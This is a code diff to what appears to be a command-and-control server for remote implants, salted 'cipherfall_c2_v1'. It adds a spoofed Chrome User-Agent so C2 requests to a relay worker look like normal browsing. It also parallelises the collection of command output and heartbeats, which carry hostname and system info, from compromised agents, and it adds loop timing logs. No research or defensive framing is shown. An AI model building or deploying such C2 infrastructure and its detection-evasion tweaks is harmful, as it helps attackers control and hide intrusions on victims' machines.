@@ -76,7 +76,10 @@ _KEY          = PBKDF2(PSK.encode(), b"cipherfall_c2_v1", dkLen=32,
 _WORKER_TOKEN = _stdlib_hmac.new(
     PSK.encode(), b"worker_token", hashlib.sha256
 ).hexdigest()[:32]
-_WORKER_HDR   = {"Authorization": f"Bearer {_WORKER_TOKEN}"}
+_WORKER_HDR   = {
+    "Authorization": f"Bearer {_WORKER_TOKEN}",
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+}
 
 
 def _encrypt(obj: dict) -> str:
@@ -138,19 +141,43 @@ async def _dispatch_pending(client: httpx.AsyncClient):
             pass
 
 
+async def _fetch_result(client: httpx.AsyncClient, task_id: str):
+    try:
+        r = await client.get(f"{WORKER_URL}/result/{task_id}")
+        if r.status_code == 200:
+            payload = _decrypt(r.text)
+            with _db() as con:
+                con.execute("UPDATE tasks SET status='done', output=? WHERE id=?",
+                            (payload.get("output", ""), task_id))
+    except Exception:
+        pass
+
+
 async def _collect_results(client: httpx.AsyncClient):
     with _db() as con:
         rows = con.execute("SELECT id FROM tasks WHERE status='sent'").fetchall()
-    for t in rows:
-        try:
-            r = await client.get(f"{WORKER_URL}/result/{t['id']}")
-            if r.status_code == 200:
-                payload = _decrypt(r.text)
-                with _db() as con:
-                    con.execute("UPDATE tasks SET status='done', output=? WHERE id=?",
-                                (payload.get("output", ""), t["id"]))
-        except Exception:
-            pass
+    await asyncio.gather(*[_fetch_result(client, t["id"]) for t in rows])
+
+
+async def _fetch_heartbeat(client: httpx.AsyncClient, agent_id: str, now: int):
+    try:
+        r = await client.get(f"{WORKER_URL}/hb/{agent_id}")
+        if r.status_code != 200:
+            return
+        payload = _decrypt(r.text)
+        sysinfo = payload.get("sysinfo", {})
+        with _db() as con:
+            con.execute(
+                "INSERT OR IGNORE INTO agents (id, label, first_seen, last_seen, sysinfo)"
+                " VALUES (?,?,?,?,?)",
+                (agent_id, sysinfo.get("hostname", agent_id[:8]), now, now, "{}")
+            )
+            con.execute(
+                "UPDATE agents SET last_seen=?, sysinfo=? WHERE id=?",
+                (now, json.dumps(sysinfo), agent_id)
+            )
+    except Exception:
+        pass
 
 
 async def _collect_heartbeats(client: httpx.AsyncClient):
@@ -163,33 +190,20 @@ async def _collect_heartbeats(client: httpx.AsyncClient):
         return
 
     now = int(time.time())
-    for agent_id in agent_ids:
-        try:
-            r = await client.get(f"{WORKER_URL}/hb/{agent_id}")
-            if r.status_code != 200:
-                continue
-            payload = _decrypt(r.text)
-            sysinfo = payload.get("sysinfo", {})
-            with _db() as con:
-                con.execute(
-                    "INSERT OR IGNORE INTO agents (id, label, first_seen, last_seen, sysinfo)"
-                    " VALUES (?,?,?,?,?)",
-                    (agent_id, sysinfo.get("hostname", agent_id[:8]), now, now, "{}")
-                )
-                con.execute(
-                    "UPDATE agents SET last_seen=?, sysinfo=? WHERE id=?",
-                    (now, json.dumps(sysinfo), agent_id)
-                )
-        except Exception:
-            pass
+    await asyncio.gather(*[_fetch_heartbeat(client, aid, now) for aid in agent_ids])
 
 
 async def _dispatch_loop():
-    async with httpx.AsyncClient(headers=_WORKER_HDR, timeout=15.0) as client:
+    async with httpx.AsyncClient(headers=_WORKER_HDR, timeout=5.0) as client:
         while True:
+            t0 = time.time()
             await _dispatch_pending(client)
+            t1 = time.time()
             await _collect_results(client)
+            t2 = time.time()
             await _collect_heartbeats(client)
+            t3 = time.time()
+            print(f"[loop] dispatch={1000*(t1-t0):.0f}ms collect={1000*(t2-t1):.0f}ms hb={1000*(t3-t2):.0f}ms", flush=True)
             await asyncio.sleep(POLL_INT)
 
 
